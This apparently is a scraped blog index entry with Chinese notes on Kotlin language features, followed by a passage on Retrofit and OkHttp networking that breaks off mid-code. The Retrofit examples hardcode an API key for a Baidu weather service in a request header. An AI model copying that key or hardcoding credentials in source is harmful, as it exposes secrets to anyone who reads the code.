inline fun a2(crossinline block: () -\u0026gt; Unit) { 可以通过 crossinline 修饰函数参数，交叉内联此函数参数 thread { block() } 作为函数调用 等同于 thread(block = { block() }) 移至括号内并命名参数 } inline fun x(block: () -\u0026gt; Unit) { thread(block = block) 编译器报错：不能将内联函数作为参数传入 } inline fun b(noinline block: () -\u0026gt; Unit) { 可以通过 noinline 修饰函数参数，取消内联此函数参数，从而可以作为参数传入；但 inline 签名就没起到作用了 thread(block = block) 作为普通参数传入 } data class A(val id: Int, val name: String) : Closeable { 数据类：自动生成 hashCode、equals、toString、copy 函数 override fun close() { println(\u0026#34;close!\u0026#34;) } } val a = A(1, \u0026#34;小明\u0026#34;) 实例化对象 val b = a.copy(name = \u0026#34;小张\u0026#34;) copy 函数（深度复制） val (x, y) = a 解构声明（component 函数） println(\u0026#34;$x $y\u0026#34;) 字符串模板 println(a) println(b) ---- 输出： 1 小明 A(id=1, name=小明) A(id=1, name=小张) ------------------------------------------------------- with(a) { 高阶函数 println(\u0026#34;[${this.id}, ${this.name}]\u0026#34;) } ---- 输出： [1, 小明] ------------------------------------------------------- a.use { 由于主动继承自 Closeable，所以能够使用 use 高阶函数（Closeable 接口的扩展函数，用于替代 Java7 的 ARM） println(\u0026#34;[${it.id}, ${it.name}]\u0026#34;) } ---- 输出： [1, 小明] close! val list = listOf(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) 生成不可变 List（元素不可被添加或删除，只读） val set = setOf(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) 生成不可变 Set val map = mapOf(\u0026#34;A\u0026#34; to 0, \u0026#34;B\u0026#34; to 1, \u0026#34;C\u0026#34; to 2) 生成不可变 Map（Kotlin 中的 Map 存储的是 Pair） val mutableList = mutableListOf(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) 生成可变 List println(list[0]) println(set.contains(\u0026#34;A\u0026#34;)) println(map[\u0026#34;A\u0026#34;]) ---- 输出： A true 0 for ((k, v) in map) { 解构声明（Kotlin 中的 Map 存储的是 Pair） println(\u0026#34;$k -\u0026gt; $v\u0026#34;) } ---- 输出： A -\u0026gt; 0 B -\u0026gt; 1 C -\u0026gt; 2 ------------------------------------------------------- val list = listOf(\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;) list.asIterable() Iterable：急性求值（Eager）（多用于小型集合）（默认） .filter { println(\u0026#34;filter：$it\u0026#34;) true } .map { println(\u0026#34;map：$it\u0026#34;) it.toInt() } .first().let(::println) ---- 输出： filter：A filter：B filter：C map：A map：B map：C 65 list.asSequence() Sequence：惰性求值（Lazy）（多用于大型集合）（类似于 Java8 中的数据流） .filter { println(\u0026#34;filter：$it\u0026#34;) true } .map { println(\u0026#34;map：$it\u0026#34;) it.toInt() } .first().let(::println) ---- 输出： filter：A map：A 65 ------------------------------------------------------- val map: Map\u0026lt;String, List\u0026lt;Int\u0026gt;\u0026gt; = (1..9) .map { it * 3 } 映射 .filter { it \u0026lt; 20 } 过滤 .groupBy { it % 2 == 0 } 分组 .mapKeys { 映射 if (it.key) { \u0026#34;偶数\u0026#34; } else { \u0026#34;奇数\u0026#34; } } println(map) ---- 输出： {奇数=[3, 9, 15], 偶数=[6, 12, 18]} ------------------------------------------------------- val list1 = listOf(1..3, 4..6) [1..3, 4..6] val list2 = list1.flatMap { it } [1, 2, 3, 4, 5, 6] 平铺 val list3 = list2.map { it * 2 } [2, 4, 6, 8, 10, 12] 映射 ------------------------------------------------------- val intRange = 1..4 val i = intRange.reduce { acc, i -\u0026gt; acc + i } 10（不带初始值） val j = intRange.fold(-5) { acc, i -\u0026gt; acc + i } 5（带有初始值） ------------------------------------------------------- val intRange = 1..10 val list = intRange.takeWhile { it % 5 != 0 } [1, 2, 3, 4]（一直获取，直到元素不符合条件为止） ------------------------------------------------------- val list: List\u0026lt;Any\u0026gt; = listOf(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, 1, 2, 3, 4) list.filter { it is Int \u0026amp;\u0026amp; it % 2 != 0 }.forEach(::println) ↳ 判断类型 ↳ 自动转型（Smart Cast） ↳ 函数引用 ---- 输出： 1 3 for： val intRange: IntRange = 1..5 范围表达式 for (i in intRange) { print(\u0026#34;$i \u0026#34;) } 可简化为 for (i in 1..5) { 1 2 3 4 5 （全包含） print(\u0026#34;$i \u0026#34;) } for (i in 1 until 5) { 1 2 3 4 （半包含） print(\u0026#34;$i \u0026#34;) } for (i in 2..10 step 2) { 2 4 6 8 10 （步长） print(\u0026#34;$i \u0026#34;) } for (i in 10 downTo 5) { 10 9 8 7 6 5 （降序） print(\u0026#34;$i \u0026#34;) } for (c in \u0026#34;Hello\u0026#34;) { println(c) } if (i in 1..10) { println(\u0026#34;YES\u0026#34;) } else { println(\u0026#34;NO\u0026#34;) } 遍历对象并带有索引位置 ---- val strs = arrayOf(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) for ((index, s) in strs.withIndex()) { 对 IndexedValue\u0026lt;T\u0026gt; 的解构声明 println(\u0026#34;$index -\u0026gt; $s\u0026#34;) } strs.forEachIndexed { index, s -\u0026gt; println(\u0026#34;$index -\u0026gt; $s\u0026#34;) } ---- 输出： 0 -\u0026gt; A 1 -\u0026gt; B 2 -\u0026gt; C 0 -\u0026gt; A 1 -\u0026gt; B 2 -\u0026gt; C ------------------------------------------------------- while、do...while： var i = 0 while (i \u0026lt; 5) { println(i) i++ } do { println(i) i++ } while (i \u0026lt; 10) ---- 输出： 0 1 2 3 4 5 6 7 8 9 ------------------------------------------------------- when（和所有分支条件进行顺序比较，用于替代 Java 中的 switch）： val i = 8 when (i) { 提供参数，匹配对应参数类型，替代 switch 0, 21 -\u0026gt; println(\u0026#34;0 or 21\u0026#34;) in 1..20 -\u0026gt; println(\u0026#34;1 to 20\u0026#34;) 在 !in 22..100 -\u0026gt; print(\u0026#34;x\u0026lt;0 or x\u0026gt;100\u0026#34;) 不在 is Int -\u0026gt; print(\u0026#34;is Int\u0026#34;) 是（Smart Cast） !is Int -\u0026gt; print(\u0026#34;not Int\u0026#34;) 不是 else -\u0026gt; println(\u0026#34;other\u0026#34;) } when { 不提供参数，匹配布尔类型，可替代 if-else if 链 i \u0026lt; 5 -\u0026gt; println(\u0026#34;first block\u0026#34;) i \u0026lt; 10 -\u0026gt; println(\u0026#34;second block\u0026#34;) else -\u0026gt; println(\u0026#34;else block\u0026#34;) } ------------------------------------------------------- 流程控制语句可作为表达式提供返回值。 val s = if (Math.random() - Math.random() \u0026gt; 0) { \u0026#34;成功\u0026#34; } else { \u0026#34;失败\u0026#34; } 可简化为 val s = if (Math.random() - Math.random() \u0026gt; 0) \u0026#34;成功\u0026#34; else \u0026#34;失败\u0026#34; 替代三元运算符 val s2 = when (Math.random() - Math.random() \u0026gt; 0) { true -\u0026gt; \u0026#34;成功\u0026#34; false -\u0026gt; \u0026#34;失败\u0026#34; else -\u0026gt; \u0026#34;失败\u0026#34; } ------------------------------------------------------- fun smartCast(x: Any): Boolean { 自动类型转换（智能转型） if (x is Boolean) { 通过类型检查后自动转换类型 return x } else if (x is Int) { return x \u0026gt; 0 } else if (x is String) { return x.startsWith(\u0026#34;Hello\u0026#34;) } else { return false } } 可简化为 fun smartCast(x: Any): Boolean { 用 when 替代 if-else if 链 when (x) { is Boolean -\u0026gt; return x is Int -\u0026gt; return x \u0026gt; 0 is String -\u0026gt; return x.startsWith(\u0026#34;Hello\u0026#34;) else -\u0026gt; return false } } 可简化为 fun smartCast(x: Any): Boolean { 用 when 作为返回值 return when (x) { is Boolean -\u0026gt; x is Int -\u0026gt; x \u0026gt; 0 is String -\u0026gt; x.startsWith(\u0026#34;Hello\u0026#34;) else -\u0026gt; false } } 可简化为 fun smartCast(x: Any) = when (x) { 简化表达式（省略函数体和返回值） is Boolean -\u0026gt; x is Int -\u0026gt; x \u0026gt; 0 is String -\u0026gt; x.startsWith(\u0026#34;Hello\u0026#34;) else -\u0026gt; false } val any: Any = \u0026#34;ABC\u0026#34; as Any 强制类型转换（若转换失败，则抛出异常 java.lang.ClassCastException） ---- if (any is String) { 等同于 instanceof，若通过检查，则在代码块中进行智能转型（Smart Cast） println(any.length) 类型：String } println(any.length) 类型：Any，无 length 属性，报错 ------------------------------------------------------- fun String.abc(c: Char): String { 扩展函数（给一个类添加新的功能） return this.filter { it != c } false 过滤，true 不过滤 } 可简化为 fun String.abc(c: Char) = this.filter { it != c } println(\u0026#34;Hello\u0026#34;.abc(\u0026#39;l\u0026#39;)) ---- 输出： Heo fun String.Companion.abc() { 静态扩展函数（给一个类的伴生对象添加新的功能） println(\u0026#34;ABC\u0026#34;) } 可简化为 fun String.Companion.abc() = println(\u0026#34;ABC\u0026#34;) String.abc() 直接调用而不通过对象 ---- 输出： ABC val String.str1: String 扩展属性（只能为 val），同样也有静态扩展属性 get() = \u0026#34;Hello\u0026#34; println(\u0026#34;\u0026#34;.str1) ---- 输出： Hello ------------------------------------------------------- 中缀函数条件： 1. 为成员函数或扩展函数 2. 函数签名带有 infix 关键字 3. 只接收 1 个参数 infix fun Int.abc(x: Int): Int { println(\u0026#34;OK!\u0026#34;) return this + x } println(1.abc(2).abc(3)) 点号标记法 等同于 println(1 abc 2 abc 3) 中缀标记法 ---- 输出： OK! OK! 6 ------------------------------------------------------- var \u0026lt;propertyName\u0026gt;: \u0026lt;PropertyType\u0026gt; [= \u0026lt;property_initializer\u0026gt;] [\u0026lt;getter\u0026gt;] [\u0026lt;setter\u0026gt;] Kotlin 中对属性的访问自动转为编译器自动生成的默认 get/set，我们可对其进行自定义。 ---- class A { var s: String = \u0026#34;Hi\u0026#34; get() { get 可见性与此属性可见性一致 println(\u0026#34;Get\u0026#34;) return field } set(value) { set 可见性可设置为 private；另外 val 没有 set 函数和后备 field if (value.startsWith(\u0026#34;H\u0026#34;)) { println(\u0026#34;Set true\u0026#34;) field = value field：当前属性 s；this：当前类 A } else { println(\u0026#34;Set false\u0026#34;) } } } val a = A() a.s = \u0026#34;World\u0026#34; println(a.s) a.s = \u0026#34;Hello\u0026#34; println(a.s) ---- 输出： Set false Get Hi Set true Get Hello ------------------------------------------------------- 委托属性（get/set 的工厂函数） class A { val s1: String by lazy { 延迟属性：只会在第一次访问 get 的时候执行该代码块，并赋值（延迟加载） println(\u0026#34;123\u0026#34;) ↳ 计算时默认为线程同步 （synchronized），若不需要可关闭：by lazy(LazyThreadSafetyMode.NONE) {} \u0026#34;AAA\u0026#34; } var s2: String by Delegates.observable(\u0026#34;XXX\u0026#34;) { prop, old, new -\u0026gt; 可观察属性：属性改变之后回调，afterChange println(\u0026#34;$old -\u0026gt; $new\u0026#34;) ↳ 初始值 } var s3: String by Delegates.vetoable(\u0026#34;XXX\u0026#34;) { prop, old, new -\u0026gt; 可观察属性：属性改变之前回调，beforeChange println(\u0026#34;$old -\u0026gt; $new\u0026#34;) ↳ 初始值 return@vetoable true true 接受，false 丢弃 } } val a = A() println(a.s1) a.s2 = \u0026#34;BBB\u0026#34; println(a.s2) a.s3 = \u0026#34;CCC\u0026#34; println(a.s3) ---- 输出： 123 AAA XXX -\u0026gt; BBB BBB XXX -\u0026gt; CCC CCC 委托属性：所有属性存储至 Map 中 ---- class User(val map: Map\u0026lt;String, Any?\u0026gt;) { 若属性包含 var 则需换成 MutableMap val name: String by map 属性名作为 Key val age: Int by map } val user = User(mapOf(\u0026#34;name\u0026#34; to \u0026#34;ABC\u0026#34;, \u0026#34;age\u0026#34; to 25)) Key-Value（Kotlin 中的 Map 存储的是 Pair） println(\u0026#34;${user.name} ${user.age}\u0026#34;) ---- 输出： ABC 25 ------------------------------------------------------- 属性延迟加载（延迟初始化） ---- class A { val a: String by lazy { val 使用委托属性 by lazy {}：只会在第一次访问 get 的时候执行该代码块，并赋值 println(\u0026#34;123\u0026#34;) \u0026#34;AAA\u0026#34; } lateinit var b: String var 使用关键字 lateinit：可稍后手动初始化（若访问 get 时未初始化，则抛出 UninitializedPropertyAccessException 异常） } val a = A() println(a.a) a.b = \u0026#34;BBB\u0026#34; println(a.b) ---- 输出： 123 AAA BBB ------------------------------------------------------- 编译期常数值：属性值在编译期间就能够确定，需满足以下条件： 1. 为顶级属性或者是 object 的成员 2. 为 String 或者是基本类型 3. 为 val 且没有自定义的 get 函数 const val i = 5 class A { var name = \u0026#34;\u0026#34; var age = 20 } 可简化为 class A constructor(var name: String = \u0026#34;\u0026#34;, var age: Int = 20) { 主构造函数 } 可简化为 class A(var name: String = \u0026#34;\u0026#34;, var age: Int = 20) 主构造函数无注解和修饰符，可省略 constructor；无类体，可省略 {} ------------------------------------------------------- data class A(var name: String, var age: Int) { Kotlin 中的类可以有一个主（要）构造函数和多个次（要）构造函数 init { println(\u0026#34;主构造函数 or 初始化块\u0026#34;) } constructor(name: String) : this(name, 0) { 声明次构造函数 println(\u0026#34;次构造函数1\u0026#34;) } constructor(age: Int) : this(\u0026#34;无名氏\u0026#34;, age) { println(\u0026#34;次构造函数2\u0026#34;) } } println(A(\u0026#34;张三\u0026#34;, 20)) println(A(\u0026#34;张三\u0026#34;)) println(A(20)) //println(A()) 报错，没有无参构造函数 ---- 输出： 主构造函数 or 初始化块 A(name=张三, age=20) - 主构造函数 or 初始化块 次构造函数1 A(name=张三, age=0) - 主构造函数 or 初始化块 次构造函数2 A(name=无名氏, age=20) ------------------------------------------------------- 如果主构造函数的所有参数都有默认值，则默认会生成一个无参次构造函数。 如果没有声明任何（主或次）构造函数，则默认会生成一个无参主构造函数。 data class A private constructor(var name: String, var des: String) { 指定主构造函数为 private constructor(name: String) : this(name, \u0026#34;欢迎：$name\u0026#34;) 默认 public } println(A(\u0026#34;张三\u0026#34;)) //println(A(\u0026#34;张三\u0026#34;, \u0026#34;ABC\u0026#34;)) 报错，主构造函数为 private ---- 输出： A(name=张三, des=欢迎：张三) ------------------------------------------------------- import javafx.application.Application import javafx.scene.Scene import javafx.scene.layout.BorderPane import javafx.stage.Stage fun main(args: Array\u0026lt;String\u0026gt;) { JavaFX Application.launch(A::class.java, *args) 从 KClass 对象获得 Class 对象 } class A : Application() { 继承 Application 抽象类（显式调用构造函数） override fun start(primaryStage: Stage) { 实现抽象函数 primaryStage.title = \u0026#34;ABC\u0026#34; primaryStage.width = 400.toDouble() primaryStage.height = 300.toDouble() primaryStage.scene = Scene(BorderPane()) primaryStage.show() } } interface A { 接口（跟 Java 一样，单继承多实现） val i: Int 抽象属性 val j: Int 属性：已提供访问器实现（若属性修饰为 var，还需提供 set() 实现） get() = 2 fun a() 抽象函数 fun b() {} 函数：已提供函数实现 } class B : A { 通过类实现接口 override val i: Int get() = 1 override fun a() {} } val a = object : A { 通过对象表达式实现接口（匿名内部类） override val i: Int get() = 1 override fun a() {} } ------------------------------------------------------- 对象表达式（匿名内部类）： val o = object { val x = 1 val y = 2 val z = 3 operator fun component1() = x 解构函数 operator fun component2() = y 解构函数 operator fun component3() = z 解构函数 } 等同于 val o = object : Any() { Kotlin 中 Any 是所有类的父类 val x = 1 val y = 2 val z = 3 operator fun component1() = x operator fun component2() = y operator fun component3() = z } val (x, y, z) = o 解构声明 println(x + y + z) 6 println(o.x + o.y + o.z) 6 ------------------------------------------------------- 对象声明（单例模式）： object MyObject { 单例对象（Singleton） val AUTHOR = \u0026#34;XhstormR\u0026#34; 属性为 static fun hello(): String { 函数不为 static，可加上 \u0026#34;@JvmStatic\u0026#34; 注解成为 static 函数，针对属性同样还有 \u0026#34;@JvmField\u0026#34;，都仅对 Java 互操作有影响。 return \u0026#34;Hello $AUTHOR!\u0026#34; } } println(MyObject.AUTHOR) println(MyObject.hello()) ---- 输出： XhstormR Hello XhstormR! ------------------------------------------------------- open class A A 类 interface B B 接口 class C : A(), B C 继承 A 并实现 B（类默认生成无参主构造函数，接口无构造函数且默认开放） （operator）操作符重载 ---- class A(var i: Int) { operator fun inc(): A { a++ i++ return this } operator fun dec(): A { a-- i-- return this } operator fun invoke(): Int { a() return i } operator fun get(index: Int): Int { a[0] return i } operator fun set(index: Int, int: Int) { a[0] = 123 i = int } operator fun compareTo(o: A): Int { \u0026gt;,\u0026lt;,\u0026gt;=,\u0026lt;= return i.compareTo(o.i) } override operator fun equals(other: Any?): Boolean { ==,!=（IDE 生成） if (this === other) return true if (other?.javaClass != javaClass) return false other as A if (i != other.i) return false return true } override fun hashCode(): Int { IDE 生成 return i } override fun toString(): String { IDE 生成 return \u0026#34;A(i=$i)\u0026#34; } } Java： class Test1 { static { System.out.println(\u0026#34;1父类静态初始化块\u0026#34;); } { System.out.println(\u0026#34;2父类初始化块\u0026#34;); } Test1() { System.out.println(\u0026#34;3父类构造方法\u0026#34;); } } ---- class Test2 extends Test1 { static { System.out.println(\u0026#34;1子类静态初始化块\u0026#34;); } { System.out.println(\u0026#34;2子类初始化块\u0026#34;); } Test2() { System.out.println(\u0026#34;3子类构造方法\u0026#34;); } } ---- class Initial { public static void main(String[] args) { Test1 a = new Test2(); } } ---- 输出： 1父类静态初始化块 1子类静态初始化块 2父类初始化块 3父类构造方法 2子类初始化块 3子类构造方法 ------------------------------------------------------- Kotlin： open class Test1 { Kotlin 跟 Java 相反，类和方法都默认为 final（最终），需用 open（开放）指明可以继承 companion object { 伴生对象（静态内部类 Companion）（static 初始化块、方法、属性） init { println(\u0026#34;1父类静态初始化块\u0026#34;) } } init { println(\u0026#34;2父类初始化块\u0026#34;) println(\u0026#34;3父类构造函数(主)\u0026#34;) } } ---- class Test2 : Test1() { 需显式调用父类的构造方法 companion object { 伴生对象（静态内部类 Companion）（static 初始化块、方法、属性） init { println(\u0026#34;1子类静态初始化块\u0026#34;) } } init { println(\u0026#34;2子类初始化块\u0026#34;) println(\u0026#34;3子类构造函数(主)\u0026#34;) } } ---- fun main(args: Array\u0026lt;String\u0026gt;) { val a: Test1 = Test2() 多态 val companion = Test2.Companion 获得类中的伴生对象 } ---- 输出： 1父类静态初始化块 1子类静态初始化块 2父类初始化块 3父类构造函数(主) 2子类初始化块 3子类构造函数(主) ------------------------------------------------------- class A { companion object { 伴生对象（静态内部类 Companion）（static 初始化块、方法、属性） var i = 0 init { println(\u0026#34;静态初始化块\u0026#34;) } } init { println(\u0026#34;${++i} 初始化块 构造函数(主)\u0026#34;) } } A() A() A() A() ---- 输出： 静态初始化块 1 初始化块 构造函数(主) 2 初始化块 构造函数(主) 3 初始化块 构造函数(主) 4 初始化块 构造函数(主) ------------------------------------------------------- class A { companion object { 伴生对象（静态内部类 Companion）（static 初始化块、方法、属性） val list = arrayListOf\u0026lt;A\u0026gt;() } init { list.add(this) } } A() A() A() println(A.list) ---- 输出： [A@2f0e140b, A@7440e464, A@49476842] ------------------------------------------------------- 默认内部类静态化，可在一定程度上降低发生内存泄露的概率。 很多时候内部类仅用来存储数据，并不需要访问外部类的成员。 class Outer { private val bar = 1 class Nested { Java 中的静态内部类：相当于独立出来的类，不会持有其外部类的强引用。 fun foo() = 2 } } Outer.Nested().foo() 不需要实例化外部类 ---- class Outer { private val bar = 1 inner class Nested { Java 中的内部类：默认持有其外部类的强引用。 fun foo() = bar 可以访问外部类的成员 } } Outer().Nested().foo() 需要实例化外部类 val array = arrayOfNulls\u0026lt;Int\u0026gt;(5) 创建容量为 5 以 null 填充的空数组 for (i in array.indices) { println(array[i]) } ---- 输出： null null null null null ------------------------------------------------------- val s1 = \u0026#34;ABC\u0026#34; val s2 = StringBuilder(\u0026#34;ABC\u0026#34;).toString() println(s1 == s2) 比较实际内容（operator 重载，调用 equals()），对应 != println(s1 === s2) 比较内存地址（Java 中的 `==`），对应 !== ---- 输出： true false ------------------------------------------------------- Kotlin： val a: Char = \u0026#39;A\u0026#39; 在 Java 中为基本数据类型 char val b: Char? = \u0026#39;B\u0026#39; 在 Java 中为引用数据类型 Character println(a) println(b) Convert to Java： char a = 65; Character b = Character.valueOf(\u0026#39;B\u0026#39;); System.out.println(a); System.out.println(b); ---- Kotlin： val arrayOf = arrayOf(1, 2, 3) val intArrayOf = intArrayOf(4, 5, 6) 避免装箱，提高性能 Convert to Java： Object[] elements$iv = new Integer[]{Integer.valueOf(1), Integer.valueOf(2), Integer.valueOf(3)}; Integer[] arrayOf = (Integer[])((Object[])elements$iv); int[] var10000 = new int[]{4, 5, 6}; ------------------------------------------------------- FileOutputStream(\u0026#34;\u0026#34;\u0026#34;D:\\123.txt\u0026#34;\u0026#34;\u0026#34;, true).bufferedWriter().use { it.write(\u0026#34;${LocalDateTime.now()}\\n\u0026#34;) } 写 FileInputStream(\u0026#34;\u0026#34;\u0026#34;D:\\123.txt\u0026#34;\u0026#34;\u0026#34;).bufferedReader().useLines { it.forEach(::println) } 读 ------------------------------------------------------- println(String().javaClass) 从实例对象获得 Class 对象 println(String::class.java) 从 KClass 对象获得 Class 对象 ---- 输出： class java.lang.String 完全类名限定符 class java.lang.String Script D:\\Download\\kotlinc\\bin\u0026gt;kotlinc -script DeleteFile.kts JavaScript D:\\Download\\kotlinc\\bin\u0026gt;kotlinc-js -output 123.js A.kt D:\\Download\\kotlinc\\lib\\kotlin-stdlib-js.jar\\kotlin.js @JsName(\u0026#34;main\u0026#34;) fun main(args: Array\u0026lt;String\u0026gt;) { js(\u0026#34;\u0026#34;\u0026#34;document.write(message+\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;)\u0026#34;\u0026#34;\u0026#34;) alert(message) } val message = \u0026#34;Hello JavaScript.\u0026#34; external fun alert(message: Any?)//暴露外部 API \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;123\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;kotlin.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;123.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Reference https://realm.io/cn/news/droidcon-michael-pardo-kotlin/ https://realm.io/cn/news/getting-started-with-kotlin-and-anko/ https://realm.io/cn/news/oredev-jake-wharton-kotlin-advancing-android-dev/ JavaScript： https://github.com/Kotlin/dukat https://github.com/vuejs/vue/tree/dev/types https://www.typescriptlang.org/dt/search ","permalink":"https://xhstormr.github.io/blog/posts/kotlin/","summary":"","title":"Kotlin"},{"content":"Updated on 2016-12-22\nRESTful API\n网络请求框架\nRetrofitting OkHttp\n1.Retrofit 封装参数，2.OkHttp 访问网络，3.Retrofit 解析结果\nhttps://github.com/square/retrofit\nhttps://github.com/square/okhttp\nhttps://github.com/square/okio\nhttps://jcenter.bintray.com/com/squareup/retrofit2/\nIntroduction String public interface DoubanService { 定义服务接口 @GET(\u0026#34;v2/book/{id}\u0026#34;) @Path：占位符 {id} （子 URL 不以 / 开头） Observable\u0026lt;String\u0026gt; book(@Path(\u0026#34;id\u0026#34;) int id); } ---- Retrofit retrofit = new Retrofit.Builder() ServiceFactory .baseUrl(\u0026#34;https://api.douban.com/\u0026#34;) （父 URL 以 / 结尾） .addCallAdapterFactory(RxJavaCallAdapterFactory.create()) 使用 RxJava 回调 .addConverterFactory(ScalarsConverterFactory.create()) 使用 String 格式 .build(); DoubanService service = retrofit.create(DoubanService.class); 创建服务实例 Observable\u0026lt;String\u0026gt; book = service.book(26840298); 调用服务接口，返回 Observable\u0026lt;String\u0026gt; 对象 book .observeOn(AndroidSchedulers.mainThread()) .subscribeOn(Schedulers.io()) .subscribe( s -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, s), error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error), () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 开始访问 \u0026#34;https://api.douban.com/v2/book/26840298\u0026#34; ------------------------------------------------------- Call 原生回调： call.execute(); 开始同步请求 call.enqueue(Callback); 开始异步请求 call.cancel(); 取消请求 ------------------------------------------------------- @Path 替换请求地址中的变量 @Body POST 请求中的请求体 @Query 通过注解的名字指明 query 参数的名字 @Header 通过注解的名字指明 header 参数的名字 JSON public interface DoubanService { 定义服务接口 @GET(\u0026#34;v2/book/{id}\u0026#34;) @Path：占位符 {id} Observable\u0026lt;Book\u0026gt; book(@Path(\u0026#34;id\u0026#34;) int id); 若不需要定制 JSON 对象，可直接换为 Observable\u0026lt;JsonObject\u0026gt; } ---- Retrofit retrofit = new Retrofit.Builder() ServiceFactory .baseUrl(\u0026#34;https://api.douban.com/\u0026#34;) .addCallAdapterFactory(RxJavaCallAdapterFactory.create()) 使用 RxJava 回调 .addConverterFactory(GsonConverterFactory.create()) 使用 JSON 格式（若要添加多个返回格式，converter 添加顺序：JSON 需在最后） .build(); DoubanService service = retrofit.create(DoubanService.class); 创建服务实例 Observable\u0026lt;Book\u0026gt; book = service.book(26840298); 调用服务接口，返回 Observable\u0026lt;Book\u0026gt; 对象 book .observeOn(AndroidSchedulers.mainThread()) .subscribeOn(Schedulers.io()) .subscribe( b -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, b.toString()), error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error), () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 开始访问 \u0026#34;https://api.douban.com/v2/book/26840298\u0026#34; ---- public class Book { 定义 JSON 对象 public String title; public String subtitle; public String[] author; public String pages; public String price; public String image; @Override public String toString() { return \u0026#34;Book{\u0026#34; + \u0026#34;title=\u0026#39;\u0026#34; + title + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, subtitle=\u0026#39;\u0026#34; + subtitle + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, author=\u0026#34; + Arrays.toString(author) + \u0026#34;, pages=\u0026#39;\u0026#34; + pages + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, price=\u0026#39;\u0026#34; + price + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, image=\u0026#39;\u0026#34; + image + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } Interceptor OkHttpClient okHttpClient = new OkHttpClient.Builder() 自定义 OkHttpClient（OkHttpClient 在整个 App 中应为单例） .addInterceptor(new Interceptor() { 添加拦截器 @Override public Response intercept(Chain chain) throws IOException { Log.w(\u0026#34;Tag\u0026#34;, chain.request().url().toString()); 打印请求网址 return chain.proceed(chain.request()); 继续执行 } }) .build(); Retrofit retrofit = new Retrofit.Builder() .baseUrl(\u0026#34;https://api.douban.com/\u0026#34;) .client(okHttpClient) 指定 OkHttpClient .addCallAdapterFactory(RxJavaCallAdapterFactory.create()) .addConverterFactory(ScalarsConverterFactory.create()) .build(); Code public interface APIService { @GET(\u0026#34;get\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; get(@Query(\u0026#34;name\u0026#34;) String s); @GET(\u0026#34;get\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; get2(@Query(\u0026#34;name\u0026#34;) List\u0026lt;String\u0026gt; list); @GET(\u0026#34;headers\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; headers(@Header(\u0026#34;User-Agent\u0026#34;) String s); @Headers(\u0026#34;Content-Type:text/plain\u0026#34;) @POST(\u0026#34;post\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; post(@Body String s); @FormUrlEncoded 与 @Field 搭配使用 @POST(\u0026#34;post\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; post2(@Field(\u0026#34;book\u0026#34;) String book); //同样也接收 List，也有 @FieldMap @GET(\u0026#34;https://api.douban.com/v2/book/search\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; searchBook( @Query(\u0026#34;q\u0026#34;) String key, //@Query：键值对 q=key @Query(\u0026#34;tag\u0026#34;) String tag, @Query(\u0026#34;start\u0026#34;) int offset, @Query(\u0026#34;count\u0026#34;) int size); @GET(\u0026#34;https://api.douban.com/v2/book/search\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; searchBook2(@QueryMap Map\u0026lt;String, Object\u0026gt; map); @GET(\u0026#34;http://apis.baidu.com/apistore/weatherservice/citylist\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; getWeather( @Header(\u0026#34;apikey\u0026#34;) String apikey, //同样也有 @HeaderMap @Query(\u0026#34;cityname\u0026#34;) String cityname); @Headers(\u0026#34;apikey:fb71ed4dc47c3559ebf3bf588304608f\u0026#34;) @GET(\u0026#34;http://apis.baidu.com/apistore/weatherservice/citylist\u0026#34;) Observable\u0026lt;JsonObject\u0026gt; getWeather2(@Query(\u0026#34;cityname\u0026#34;) String cityname); @GET Observable\u0026lt;JsonObject\u0026gt; getJSON(@Url String url); @Streaming 大文件 @GET Observable\u0026lt;ResponseBody\u0026gt; downloadFile(@Url String url); ResponseBody 为原生返回值 } ---- public class MainActivity extends Activity { private static final Action1\u0026lt;Object\u0026gt; mAction1 = o -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, o.toString()); Observer private static final Observable.Transformer\u0026lt;Object, Object\u0026gt; mTransformer = observable -\u0026gt; 重用操作链 observable .observeOn(AndroidSchedulers.mainThread()) 切换至主线程 (2) .subscribeOn(Schedulers.io()); 指定最开始在IO线程中运行 (1) @SuppressWarnings(\u0026#34;unchecked\u0026#34;) 压制警告（强制类型转换） private static \u0026lt;T\u0026gt; Observable.Transformer\u0026lt;T, T\u0026gt; applySchedulers() { 重用操作链 return ((Observable.Transformer\u0026lt;T, T\u0026gt;) mTransformer); 返回 Transformer 